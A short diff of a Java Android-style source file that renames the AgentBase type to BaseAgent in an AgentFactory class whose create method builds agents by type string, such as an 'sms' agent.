@@ -13,7 +13,7 @@ import com.android.service.auto.Cfg;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
 
-public class AgentFactory implements AbstractFactory<AgentBase, String> {
+public class AgentFactory implements AbstractFactory<BaseAgent, String> {
 	private static final String TAG = "AgentFactory"; //$NON-NLS-1$
 
 	/**
@@ -24,8 +24,8 @@ public class AgentFactory implements AbstractFactory<AgentBase, String> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	public AgentBase create(String type) {
-		AgentBase a = null;
+	public BaseAgent create(String type) {
+		BaseAgent a = null;
 
 		if("sms".equals(type)){
 			a = new AgentMessage();
